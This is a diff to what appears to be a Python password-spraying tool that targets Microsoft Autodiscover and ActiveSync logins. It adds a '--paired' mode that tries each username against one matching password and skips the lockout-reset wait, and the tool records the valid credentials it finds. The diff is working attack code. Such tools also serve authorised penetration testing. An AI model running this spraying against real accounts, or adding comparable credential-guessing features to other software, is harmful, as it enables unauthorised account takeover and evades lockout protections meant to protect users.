@@ -204,6 +204,14 @@ class Sprayer:
 
         await wait(futures)
 
+    async def run_paired(self, password_list):
+        """ Asynchronously send HTTP requests """
+        futures = [self.loop.run_in_executor(
+            self.executor, self.spray, user, password
+        ) for user, password in zip(self.user_list, password_list)]
+
+        await wait(futures)
+
     def spray(self, user, password):
         """ Password spray Microsoft using Microsoft Autodiscover """
         try:
@@ -264,6 +272,7 @@ if __name__ == "__main__":
     parser.add_argument("--threads", type=int, help="Number of threads to run. Default: 10", default=10)
     parser.add_argument("--output",  type=str, help="Output file name for enumeration and spraying")
     parser.add_argument("--debug",   action="store_true", help="Debug output")
+    parser.add_argument("--paired",  action="store_true", help="Password spray pairing usernames and passwords (1:1).")
 
     parser.add_argument("--spray-secondary",    action="store_true", help="Use `ActiveSync` for password spraying instead of `Autodiscover`")
     parser.add_argument("--validate-secondary", action="store_true", help="Use `openid-configuration` for domain validation instead of `getuserrealm`")
@@ -312,11 +321,17 @@ if __name__ == "__main__":
 
         spray = Sprayer(username_list, proxy=args.proxy, debug=args.debug, threads=args.threads, secondary=args.spray_secondary)
 
-        for password_chunk in helper.get_chunks_from_list(password_list, args.count):
-            print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
-            spray.loop.run_until_complete(spray.run(password_chunk))
-            if not helper.check_last_chunk(password_chunk, password_list):
-                helper.lockout_reset_wait(args.lockout)
+        if not args.paired:
+            for password_chunk in helper.get_chunks_from_list(password_list, args.count):
+                print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
+                spray.loop.run_until_complete(spray.run(password_chunk))
+                if not helper.check_last_chunk(password_chunk, password_list):
+                    helper.lockout_reset_wait(args.lockout)
+
+        else:
+            print("[*] Password spraying using paired usernames and passwords.")
+            spray.loop.run_until_complete(spray.run_paired(password_list))
+            # Since we are pairing usernames and passwords, we can ignore the lockout reset wait call
 
         helper.print_stats("Password Spraying", spray.valid_creds, ("valid_credentials.txt" if not args.output else args.output))
 
